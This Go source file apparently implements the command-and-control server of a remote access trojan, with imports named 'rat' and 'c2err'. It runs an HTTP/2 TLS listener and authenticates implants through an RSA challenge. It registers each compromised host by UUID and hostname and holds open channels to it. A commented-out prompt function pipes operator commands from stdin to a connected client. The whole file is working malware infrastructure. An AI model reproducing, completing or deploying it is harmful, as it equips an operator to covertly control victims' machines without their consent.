package server

import (
    "encoding/json"
    "encoding/pem"
    "crypto/rsa"
    "crypto/x509"
    "crypto/sha256"
    "crypto/rand"
    "crypto/tls"
    "log"
    "net/http"
    "os"
    "sync"
    "io/ioutil"
    "fmt"
    "bytes"
//    "time"
//    "strings"
//    "bufio"

    "github.com/satori/go.uuid"

    "10.9.9.2/rat/pkg/c2err"
    "10.9.9.2/rat/pkg/h2conn"
//    "unkauth"
)

type decoder interface {
    Decode(interface{}) error
}

type encoder interface {
    Encode(interface{}) error
}

type coder struct {
    Dec decoder
    Enc encoder
}

type clientInfo struct {
    Hostname	string
    IpAddr	string
    Connection	*h2conn.Conn
    Pipes	*coder
}

type clientConnections struct {
    ConnectionCountCur	int
    connectionCountTot	int
    CountUUIDMap	map[int]string
    UUIDInfoMap		map[string]*clientInfo
    lock		sync.RWMutex
}

//ClientConnections will be a map associating each client to its established connections read and write Pipes
//Client will be designated by a UUID set upon passing the authentication challenge
type Server struct {
    Address		string
    Port		string
    Protocol		string
    TlsCertificatePath  string
    TlsKeyPath		string
    AuthPublicKeyPath   string
    Server		*http.Server
    ClientConnections	clientConnections
    AuthPublicKey	*rsa.PublicKey
}

func Instantiate(addr string, port string, protocol string, tlsCertificatePath string, tlsKeyPath string, authPubKeyPath string) Server {

    clientConns := clientConnections{
	ConnectionCountCur: 0,
	connectionCountTot: 0,
	CountUUIDMap: make(map[int]string),
	UUIDInfoMap: make(map[string]*clientInfo),
    }

    s := Server{
	Address: addr,
	Port: port,
	Protocol: protocol,
	TlsCertificatePath: "",
	TlsKeyPath: "",
	AuthPublicKeyPath: "",
	Server: nil,
	ClientConnections: clientConns,
	AuthPublicKey: nil,
    }
    
    _, err := os.Stat(tlsCertificatePath)
    if os.IsNotExist(err) {
	log.Fatalln("failed to stat server tls certificate file: %s", tlsCertificatePath)
    }

    _, err = os.Stat(tlsKeyPath)
    if os.IsNotExist(err) {
	log.Fatalln("failed to stat server tls key file: %s", tlsKeyPath)
    }

    var x509pair tls.Certificate
    x509pair, err = tls.LoadX509KeyPair(tlsCertificatePath, tlsKeyPath)
    c2err.CheckError(err)
    if len(x509pair.Certificate) < 1 || x509pair.PrivateKey == nil {
	log.Fatalln("unable to import x509 pair for encrypted communication")
    }
    _, err = x509.ParseCertificate(x509pair.Certificate[0])
    c2err.CheckError(err)

    s.TlsCertificatePath = tlsCertificatePath
    s.TlsKeyPath = tlsKeyPath

    _, err = os.Stat(authPubKeyPath)
    if os.IsNotExist(err) {
	log.Fatalln("failed to stat server public key file for authentication: %s", authPubKeyPath)
    }
    s.AuthPublicKeyPath = authPubKeyPath

    var authPubKey *rsa.PublicKey
    authPubKey = serverReadAuthPublicKey(authPubKeyPath)
    if authPubKey == nil {
	log.Fatalln("failed to load server public key file for authentication")
    }
    s.AuthPublicKey = authPubKey

    tlsConfig := &tls.Config{
	Certificates: []tls.Certificate{x509pair},
	MinVersion: tls.VersionTLS12,
	CurvePreferences: []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
	CipherSuites: []uint16{
	    tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	    tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	    tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	},
    }

    tmpSrv := &http.Server{
	Addr: s.Address + ":" + s.Port,
	TLSConfig: tlsConfig,
	Handler: &s,
    }

    if s.Protocol == "h2" {
	s.Server = tmpSrv
    } else {
	log.Fatalf("attempted to create a server with an invalid protocol: %s", s.Protocol)
    }


    return s
}

func serverReadAuthPublicKey(path string) *rsa.PublicKey {
    pubkeypemdata, err := ioutil.ReadFile(path)
    c2err.CheckError(err)
    block, _ := pem.Decode(pubkeypemdata)
    if block == nil {
        log.Fatalf("failed to read pubkey pem file")
    }
    pubkey, err := x509.ParsePKIXPublicKey(block.Bytes)
    c2err.CheckError(err)
    switch pubkey := pubkey.(type) {
    case *rsa.PublicKey:
        return pubkey
    default:
        break
    }
    return nil
}

func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    conn, err := h2conn.Accept(w, r)
    if err != nil {
	http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
	c2err.CheckError(err)
    }
    defer conn.Close()
    
    var (
	in, out = json.NewDecoder(conn), json.NewEncoder(conn)
    )
    
    passed := s.createAndSendAuthChallenge(in, out)
    if passed == false {
	conn.Close()
	return
    }
    err = out.Encode("ok")
    c2err.CheckError(err)
    var clientIdMap map[string]string
    var clientIdString string
    err = in.Decode(&clientIdMap)
    c2err.CheckError(err)
    clientIdHn := clientIdMap["hostname"]
    clientIdString = clientIdMap["id"]
    _, err = uuid.FromString(clientIdString)
    if err != nil {
	clientIdString = s.register(conn, in, out, clientIdHn)
    }
    for clientIdString == "" {
	clientIdString = s.register(conn, in, out, clientIdHn)
    }
    fmt.Println("here")
    err = s.ClientConnections.UUIDInfoMap[clientIdString].Pipes.Enc.Encode(clientIdString)
    c2err.CheckError(err)

    //Wait for client to close connection
    <-r.Context().Done()
    
    //clean up on exit
    delete(s.ClientConnections.UUIDInfoMap, clientIdString)
    for k, _ := range s.ClientConnections.CountUUIDMap {
	if s.ClientConnections.CountUUIDMap[k] == clientIdString {
	    delete(s.ClientConnections.CountUUIDMap, k)
	    break
	}
    }
    s.ClientConnections.ConnectionCountCur -= 1
    //    err = out.Encode(clientIdString)
    //prompt(r, in, out)

}

func serverEncryptAuthChallengeBytes(pub *rsa.PublicKey, text []byte) []byte {
    rng := rand.Reader
    encText, err := rsa.EncryptOAEP(sha256.New(), rng, pub, text, nil)
    c2err.CheckError(err)
    return encText
}

func (s *Server) createAndSendAuthChallenge(in *json.Decoder, out *json.Encoder) bool {
    x := 64
    r := make([]byte, x)
    _, err := rand.Read(r)
    c2err.CheckError(err)
    var rEnc []byte
    rEnc = serverEncryptAuthChallengeBytes(s.AuthPublicKey, r)
    if rEnc == nil {
        log.Fatalf("failed to encrypt challenge bytes\n")
    }
    err = out.Encode(rEnc)
    c2err.CheckError(err)
    var msg []byte
    err = in.Decode(&msg)
    c2err.CheckError(err)
    if bytes.Equal(r, msg) {
        fmt.Println("client passed auth challenge")
	return true
    } else {
	return false
    }
}

func (s *Server) register(conn *h2conn.Conn, in *json.Decoder, out *json.Encoder, hn string) string {
    s.ClientConnections.lock.Lock()
    defer s.ClientConnections.lock.Unlock()
    clientId, err := uuid.NewV4()
    c2err.CheckError(err)

    clientIdStr := clientId.String()

    if _, ok := s.ClientConnections.UUIDInfoMap[clientIdStr]; ok {
	return ""
    }
    s.ClientConnections.ConnectionCountCur += 1
    s.ClientConnections.connectionCountTot += 1
    s.ClientConnections.CountUUIDMap[s.ClientConnections.connectionCountTot] = clientIdStr
    s.ClientConnections.UUIDInfoMap[clientIdStr] = new(clientInfo)
    s.ClientConnections.UUIDInfoMap[clientIdStr].Hostname = hn
    s.ClientConnections.UUIDInfoMap[clientIdStr].Pipes = &coder{Dec: in, Enc: out}
    s.ClientConnections.UUIDInfoMap[clientIdStr].Connection = conn
    return clientIdStr
}


//func prompt(r *http.Request, in *json.Decoder, out *json.Encoder) {
//    fmt.Printf("Using: %s\n", r.Proto)
//    for r.Context().Err() == nil {
//        fmt.Printf("CMD > ")
//        cmdReader := bufio.NewReader(os.Stdin)
//        cmd, _ := cmdReader.ReadString('\n')
//        cmd = strings.TrimRight(cmd, "\n")
//        if (cmd == "") {
//            continue
//        }
//        err := out.Encode(cmd)
//        if err != nil {
//            fmt.Printf("error sending command\n")
//        }
//        cmd = ""
//    }
//    fmt.Printf("client disconnected\n")
//}

func (s *Server) Run() {
    fmt.Printf("Serving on https://%s:%s\n", s.Address, s.Port)
    log.Fatal(s.Server.ListenAndServeTLS(s.TlsCertificatePath, s.TlsKeyPath))
}

